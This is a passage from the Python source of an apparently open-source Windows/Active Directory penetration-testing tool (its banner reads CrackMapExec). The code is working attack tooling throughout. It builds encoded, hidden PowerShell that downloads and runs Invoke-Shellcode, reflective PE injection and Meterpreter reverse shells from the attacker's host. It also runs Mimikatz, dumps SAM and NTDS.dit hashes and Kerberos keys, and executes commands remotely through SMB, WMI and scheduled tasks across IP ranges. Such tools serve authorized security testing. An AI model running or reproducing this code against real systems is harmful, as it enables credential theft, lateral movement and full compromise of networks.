        $request.GetResponse();
        """.format(addr=katz_ip, katz_command=katz_command)

    if args.force_ps32:
        command = 'IEX "$Env:windir\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))

    base64_command = b64encode(command.encode('UTF-16LE'))

    ps_command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64_command)

    return ps_command

def inject_pscommand(localip):

    if args.inject.startswith('met_'):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('http://{}/Invoke-Shellcode.ps1');
        Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(localip,
                                                                                              args.inject[4:], 
                                                                                              args.met_options[0], 
                                                                                              args.met_options[1])
        if args.procid:
            command += " -ProcessID {}".format(args.procid)

        command += ';'

    elif args.inject == 'shellcode':
        command = """
        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Shellcode.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('http://{addr}/{shellcode}');
        Invoke-Shellcode -Force -Shellcode $bytes""".format(addr=localip, shellcode=args.path.split('/')[-1])

        if args.procid:
            command += " -ProcessID {}".format(args.procid)

        command += ';'

    elif args.inject == 'exe' or args.inject == 'dll':
        command = """
        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-ReflectivePEInjection.ps1'); 
        Invoke-ReflectivePEInjection -PEUrl http://{addr}/{pefile}""".format(addr=localip, pefile=args.path.split('/')[-1])

        if args.procid:
            command += " -ProcID {}"

        if args.inject == 'exe' and args.exeargs:
            command += " -ExeArgs \"{}\"".format(args.exeargs)

        command += ';'

    return ps_command(command)

def connect(host):
    try:

        smb = SMBConnection(host, host, None, args.port)
        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        domain = args.domain
        s_name = smb.getServerName()
        if not domain:
            domain = smb.getServerDomain()
            if not domain:
                domain = s_name

        print_status("{}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), s_name, domain))

        '''
        DC's seem to want us to logoff first
        Workstations sometimes reset the connection, so we handle both cases here
        '''
        try:
            smb.logoff()
        except NetBIOSError:
            pass
        except socket.error:
            smb = SMBConnection(host, host, None, args.port)

        if (args.user is not None and (args.passwd is not None or args.hash is not None)) or args.combo_file:

            smb = smart_login(host, smb, domain)

            noOutput = False
            local_ip = smb.getSMBServer().get_socket().getsockname()[0]

            if args.download:
                out = open(args.download.split('\\')[-1], 'wb')
                smb.getFile(args.share, args.download, out.write)
                print_succ("{}:{} {} Downloaded file".format(host, args.port, s_name))

            if args.delete:
                smb.deleteFile(args.share, args.delete)
                print_succ("{}:{} {} Deleted file".format(host, args.port, s_name))

            if args.upload:
                up = open(args.upload[0] , 'rb')
                smb.putFile(args.share, args.upload[1], up.read)
                print_succ("{}:{} {} Uploaded file".format(host, args.port, s_name))

            if args.list:
                dir_list = smb.listPath(args.share, args.list + '\\*')
                print_succ("{}:{} Contents of {}:".format(host, args.port, args.list))
                for f in dir_list:
                    print_att("%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), ctime(float(f.get_mtime_epoch())) ,f.get_longname()))

            if args.spider:
                start_time = time()
                print_status("{}:{} {} Started spidering".format(host, args.port, s_name))
                spider(smb, host, args.share, args.spider, args.pattern, args.depth)
                print_status("{}:{} {} Done spidering (Completed in {})".format(host, args.port, s_name, time() - start_time))

            if args.wmi_query:
                query = WMIQUERY(host, args.user, args.passwd, domain, args.hash, args.namespace)
                res = query.run(args.wmi_query)
                print_succ("{}:{} {} Executed specified WMI query:".format(host, args.port, s_name))
                print yellow(' | '.join(res.keys()))
                if len(res.values()) > 1:
                    for v in map(None, *res.values()):
                        print yellow(' | '.join(v))
                else:
                    for k in res:
                        for v in res[k]:
                            print yellow(v)

            if args.enum_sessions:
                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                sessions = rpcenum.enum_sessions(host)
                print_succ("{}:{} {} Current active sessions:".format(host, args.port, s_name))
                for session in sessions:
                    for fname in session.fields.keys():
                        print "{} {}".format(fname, yellow(session[fname]))
                    print "\n"

            if args.enum_lusers:
                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                lusers = rpcenum.enum_logged_on_users(host)
                print_succ("{}:{} {} Logged on users:".format(host, args.port, s_name))
                for luser in lusers:
                    for fname in luser.fields.keys():
                        print "{} {}".format(fname, yellow(luser[fname]))
                    print "\n"

            if args.enum_disks:
                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                disks = rpcenum.enum_disks(host)
                print_succ("{}:{} {} Available disks:".format(host, args.port, s_name))
                for disk in disks['DiskInfoStruct']['Buffer']:
                    for dname in disk.fields.keys():
                        print_att(disk[dname])

            if args.rid_brute:
                lookup = LSALookupSid(args.user, args.passwd, domain, '{}/SMB'.format(args.port), args.hash, args.rid_brute)
                lookup.dump(host)
                print_succ("{}:{} {} Dumping users (rid:domain:user):".format(host, args.port, s_name))
                for user in lookup.entries:
                    print_att(user)

            if args.pass_pol:
                dumper =  SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash)
                pass_policy = dumper.get_pass_pol(host)
                print_succ("{}:{} {} Dumping password policies:".format(host, args.port, s_name))
                for policy in pass_policy:
                    print_att(policy)

            if args.enum_users:
                user_enum = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash)
                users = user_enum.get_users(host)
                print_succ("{}:{} {} Dumping users (rid:user):".format(host, args.port, s_name))
                for user in users:
                    print_att('{}: {}'.format(user[1], user[0]))

            if args.list_shares:
                share_list = _listShares(smb)
                print_succ('{}:{} {} Available shares:'.format(host, args.port, s_name))
                print_att('\tSHARE\t\t\tPermissions')
                print_att('\t-----\t\t\t-----------')
                for share, perm in share_list.iteritems():
                    print_att('\t{}\t\t\t{}'.format(share, perm))

            if args.check_uac:
                remoteOps = RemoteOperations(smb)
                remoteOps.enableRegistry()
                uac = remoteOps.checkUAC()
                print_succ("{}:{} {} UAC status:".format(host, args.port, s_name))
                if uac == 1:
                    print_att('1 - UAC Enabled')
                elif uac == 0:
                    print_att('0 - UAC Disabled')
                remoteOps.finish()

            if args.sam:
                sam_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, True)
                sam_dump.dump(smb)
                if sam_dump.dumped_sam_hashes:
                    print_succ("{}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, s_name))
                    for sam_hash in sam_dump.dumped_sam_hashes:
                        print_att(sam_hash)
                try:
                    sam_dump.cleanup()
                except:
                    pass

            if args.ntds:
                vss   = False
                ninja = False
                if args.ntds == 'vss': vss = True
                elif args.ntds == 'ninja': ninja = True

                ntds_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, False, True, vss, ninja)
                ntds_dump.dump(smb)
                if ntds_dump.dumped_ntds_hashes:
                    print_succ("{}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper()))
                    for h in ntds_dump.dumped_ntds_hashes['hashes']:
                        print_att(h)
                    print_succ("{}:{} {} Kerberos keys grabbed:".format(host, args.port, s_name))
                    for h in ntds_dump.dumped_ntds_hashes['kerb']:
                        print_att(h)
                ntds_dump.cleanup()

            if args.mimikatz:
                noOutput = True
                args.command = ps_command(katz_ip=local_ip)

            if args.mimi_cmd:
                noOutput = True
                args.command = ps_command(katz_ip=local_ip, katz_command=args.mimi_cmd)

            if args.pscommand:
                args.command = ps_command(command=args.pscommand)

            if args.inject:
                noOutput = True
                args.command = inject_pscommand(local_ip)

            if args.command:

                if args.execm == 'smbexec':
                    executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command, noOutput)
                    result = executer.run(host)
                    if result:
                        print_succ('{}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, s_name))
                        print_att(result)

                elif args.execm == 'wmi':
                    executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
                    result = executer.run(host, smb)
                    if result:
                        print_succ('{}:{} {} Executed specified command via WMI'.format(host, args.port, s_name))
                        print_att(result)

                elif args.execm == 'atexec':
                    atsvc_exec = TSCH_EXEC(args.user, args.passwd, args.command, domain, args.hash, noOutput)
                    atsvc_exec.play(host)
                    if atsvc_exec.output:
                        print_succ('{}:{} {} Executed specified command via ATEXEC'.format(host, args.port, s_name))
                        print_att(atsvc_exec.output)

                    atsvc_exec.cleanup()

        try:
            smb.logoff()
        except:
            pass

    except SessionError as e:
        print_error("{}:{} {}".format(host, args.port, e))
        if args.verbose: traceback.print_exc()

    except NetBIOSError as e:
        print_error("{}:{} NetBIOS Error: {}".format(host, args.port, e))
        if args.verbose: traceback.print_exc()

    except DCERPCException as e:
        print_error("{}:{} DCERPC Error: {}".format(host, args.port, e))
        if args.verbose: traceback.print_exc()

    except socket.error as e:
        if args.verbose: print str(e)
        return

def concurrency(hosts):
    ''' Open all the greenlet threads '''
    try:
        pool = Pool(args.threads)
        jobs = [pool.spawn(connect, str(host)) for host in hosts]
        joinall(jobs)
    except KeyboardInterrupt:
        print_status("Got CTRL-C! Exiting..")
        sys.exit()

if __name__ == '__main__':

    if os.geteuid() is not 0:
        print_error("Run me as r00t!")
        sys.exit(1)

    parser = argparse.ArgumentParser(description=""" 
  ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______ 
 /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
|  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
|  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |     
|  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
 \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|


                Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r

                      Powered by Impacket https://github.com/CoreSecurity/impacket (@agsolino)

                                                  Inspired by:
                           @ShawnDEvans's smbmap https://github.com/ShawnDEvans/smbmap
                           @gojhonny's CredCrack https://github.com/gojhonny/CredCrack
                           @pentestgeek's smbexec https://github.com/pentestgeek/smbexec
""",
                                    formatter_class=RawTextHelpFormatter,
                                    epilog='There\'s been an awakening... have you felt it?')

    parser.add_argument("-t", type=int, dest="threads", required=True, help="Set how many concurrent threads to use")
    parser.add_argument("-u", metavar="USERNAME", dest='user', type=str, default=None, help="Username(s) or file containing usernames")
    parser.add_argument("-p", metavar="PASSWORD", dest='passwd', type=str, default=None, help="Password(s) or file containing passwords")
    parser.add_argument("-H", metavar="HASH", dest='hash', type=str, default=None, help='NTLM hash(es) or file containing NTLM hashes')
    parser.add_argument("-C", metavar="COMBO_FILE", dest='combo_file', type=str, help="Combo file containing a list of domain\\username:password or username:password entries")
    parser.add_argument("-d", metavar="DOMAIN", dest='domain', default=None, help="Domain name")
    parser.add_argument("-n", metavar='NAMESPACE', dest='namespace', default='//./root/cimv2', help='WMI Namespace (default //./root/cimv2)')
    parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default: C$)")
    parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
    parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
    parser.add_argument("target", nargs=1, type=str, help="The target range, CIDR identifier or file containing targets")

    rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
    rgroup.add_argument("--sam", action='store_true', help='Dump SAM hashes from target systems')
    rgroup.add_argument("--mimikatz", action='store_true', help='Run Invoke-Mimikatz (sekurlsa::logonpasswords) on target systems')
    rgroup.add_argument("--mimikatz-cmd", metavar='MIMIKATZ_CMD', dest='mimi_cmd', help='Run Invoke-Mimikatz with the specified command')
    rgroup.add_argument("--ntds", choices={'vss', 'drsuapi', 'ninja'}, help="Dump the NTDS.dit from target DCs using the specifed method\n(drsuapi is the fastest)")

    egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
    egroup.add_argument("--shares", action="store_true", dest="list_shares", help="List shares")
    egroup.add_argument('--check-uac', action='store_true', dest='check_uac', help='Checks UAC status')
    egroup.add_argument("--sessions", action='store_true', dest='enum_sessions', help='Enumerate active sessions')
    egroup.add_argument('--disks', action='store_true', dest='enum_disks', help='Enumerate disks')
    egroup.add_argument("--users", action='store_true', dest='enum_users', help='Enumerate users')
    egroup.add_argument("--rid-brute", metavar='MAX_RID', dest='rid_brute', help='Enumerate users by bruteforcing RID\'s')
    egroup.add_argument("--pass-pol", action='store_true', dest='pass_pol', help='Dump password policy')
    egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
    egroup.add_argument("--wmi", metavar='QUERY', type=str, dest='wmi_query', help='Issues the specified WMI query')

    sgroup = parser.add_argument_group("Spidering", "Options for spidering shares")
    sgroup.add_argument("--spider", metavar='FOLDER', type=str, default='', help='Folder to spider (defaults to share root dir)')
    sgroup.add_argument("--pattern", type=str, default= '', help='Pattern to search for in filenames and folders')
    sgroup.add_argument("--patternfile", type=str, help='File containing patterns to search for')
    sgroup.add_argument("--depth", type=int, default=1, help='Spider recursion depth (default: 1)')

    cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
    cgroup.add_argument('--force-ps32', action='store_true', dest='force_ps32', help='Force all PowerShell code/commands to run in a 32bit process')
    cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
    cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')

    xgroup = parser.add_argument_group("Shellcode/EXE/DLL/Meterpreter Injection", "Options for injecting Shellcode/EXE/DLL/Meterpreter in memory using PowerShell")
    xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll', 'met_reverse_https', 'met_reverse_http'}, help='Inject Shellcode, EXE, DLL or Meterpreter')
    xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems (ignored if injecting Meterpreter)')
    xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)')
    xgroup.add_argument("--exeargs", type=str, help='Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)')
    xgroup.add_argument("--met-options", nargs=2, metavar=('LHOST', 'LPORT'), dest='met_options', help='Meterpreter options (ignored if not injecting Meterpreter)')

    bgroup = parser.add_argument_group("Filesystem Interaction", "Options for interacting with filesystems")
    bgroup.add_argument("--list", metavar='PATH', help='List contents of a directory')
    bgroup.add_argument("--download", metavar="PATH", help="Download a file from the remote systems")
    bgroup.add_argument("--upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the remote systems")
    bgroup.add_argument("--delete", metavar="PATH", help="Delete a remote file")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if args.verbose:
        print_status("Verbose output enabled")
        logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
        log = logging.getLogger()
        log.setLevel(logging.INFO)

    if args.inject:
        if not args.inject.startswith('met_'):
            if not args.path:
                print_error("You must specify a '--path' to the Shellcode/EXE/DLL to inject")
                sys.exit(1)

            elif args.path:
                if not os.path.exists(args.path):
                    print_error('Unable to find Shellcode/EXE/DLL at specified path')
                    sys.exit(1)

        elif args.inject.startswith('met_'):
            if not args.met_options:
                print_error('You must specify Meterpreter\'s options using --met-options' )
                sys.exit(1)

    if os.path.exists(args.target[0]):
        hosts = []
        with open(args.target[0], 'r') as target_file:
            for target in target_file:
                hosts.append(IPAddress(target))

    elif '-' in args.target[0]:
        ip_range = args.target[0].split('-')
        try:
            hosts = IPRange(ip_range[0], ip_range[1])
        except AddrFormatError:
            start_ip = IPAddress(ip_range[0])

            start_ip_words = list(start_ip.words)
            start_ip_words[-1] = ip_range[1]
            start_ip_words = [str(v) for v in start_ip_words]

            end_ip = IPAddress('.'.join(start_ip_words))

            hosts = IPRange(start_ip, end_ip)

    else:
        hosts = IPNetwork(args.target[0])

    if args.spider:
        patterns = []
        if not args.pattern and not args.patternfile:
            print_error("Please specify a '--pattern' or a '--patternfile'")
            sys.exit(1)

        if args.patternfile:
            if not os.path.exists(args.patternfile):
                print_error("Unable to find pattern file at specified path")
                sys.exit(1)

            for line in args.patternfile.readlines():
                line = line.rstrip()
                patterns.append(line)

        patterns.append(args.pattern)

        args.pattern = patterns

    if args.combo_file:
        if not os.path.exists(args.combo_file):
            print_error('Unable to find combo file at specified path')
            sys.exit(1)

    if args.mimikatz or args.mimi_cmd or args.inject or (args.ntds == 'ninja'):
        print_status("Press CTRL-C at any time to exit")
        print_status('Note: This might take some time on large networks! Go grab a redbull!\n')

        server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
        t = Thread(name='HTTPServer', target=server.serve_forever)
        t.setDaemon(True)
        t.start()

    concurrency(hosts)

    if args.mimikatz or args.inject or args.ntds == 'ninja':
        try:
            while True:
                sleep(1)
        except KeyboardInterrupt:
            sys.exit()
